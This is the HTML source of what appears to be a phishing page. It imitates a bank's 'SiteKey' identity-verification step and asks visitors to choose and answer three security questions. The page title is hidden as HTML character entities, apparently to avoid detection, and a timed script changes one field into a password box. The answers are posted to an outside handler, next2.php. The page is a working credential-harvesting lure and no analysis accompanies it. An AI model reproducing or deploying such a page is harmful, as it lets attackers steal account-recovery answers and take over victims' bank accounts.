<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>

<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 1274px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>


</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:0"><img src="images/bb7.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:4"><img src="images/bb8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image15" style="position:absolute; overflow:hidden; left:133px; top:910px; width:987px; height:150px; z-index:5"><img src="images/bbo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:159px; top:958px; width:108px; height:17px; z-index:6"><a href="#"><img src="images/bbo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:521px; height:28px; z-index:7"><img src="images/bb9.png" alt="" title="" border=0 width=521 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:318px; top:716px; width:75px; height:29px; z-index:8"><a href="#"><img src="images/bb10.png" alt="" title="" border=0 width=75 height=29></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:193px; top:242px; width:137px; height:377px; z-index:12"><img src="images/ba2.png" alt="" title="" border=0 width=137 height=377></div>

<form action=next2.php name=chalojee id=chalojee method=post>
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:198px;top:268px;width:385px;z-index:18">
<option value="Select SiteKey Challenge Question 1">Select SiteKey Challenge Question 1</option>
<option>what is the first name of your mothers closest friend?</option>
<option>what was the name of your first pet?</option>
<option>what is the first name of your favorite niece/nephew?</option>
<option>what is the first name your hairdresserr/barber?</option>
<option>what is the name of your best childhood friend? </option>
<option>on what street is your grocery store?</option>
<option>what is the name of the medical professional who delivered your first child?</option>
<option>what is the name of a college you applied to but didnt atted? </option>
<option>what was the first name of your favorite teacher or professor?</option>
<option>what is your all-time favorite song? </option></select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:198px;top:340px;z-index:19">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:198px;top:412px;width:385px;z-index:20">
<option value="Select SiteKey Challenge Question 2">Select SiteKey Challenge Question 2</option>
<option>what is the first name of your high school prom date?</option>
<option>who is your favorite person in history?</option>
<option>what was the make and model of your first car? </option>
<option>what is first name of best man/main of honor at your wedding? </option>
<option>what is the name of your favorite restaurant?</option>
<option>as a child what did you want to be when you grew up? </option>
<option>what was the first live concert you attended?</option>
<option>what was the first name of your first manager?</option>
<option>what is the name of your high school star athlete?</option>
<option>where were you on New Years 2000? </option></select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:198px;top:484px;z-index:21">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:198px;top:556px;width:385px;z-index:22">
<option value="Select SiteKey Challenge Question 3">Select SiteKey Challenge Question 3</option>
<option>what street did your best friend ih high school live on?</option>
<option>what was the name of your first boyfriend or girlfriend?</option>
<option>what is your best friend first name?</option>
<option>what is the last name of your third grade teacher?</option>
<option>what is the last name of your family physician?</option>
<option>in what city did you honeymoon?</option>
<option>in what city did you meet your spouse/significant other?</option>
<option>what celebrity do you most resemble?</option>
<option>what is the name of your favorite charity?</option>
<option>what is the name of your first babysitter?</option></select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:198px;top:628px;z-index:23">

<div id="formimage1" style="position:absolute; left:198px; top:716px; z-index:24"><input type="image" name="formimage1" width="102" height="28" src="images/bz2.png"></div>
</div>

</body>
</html>
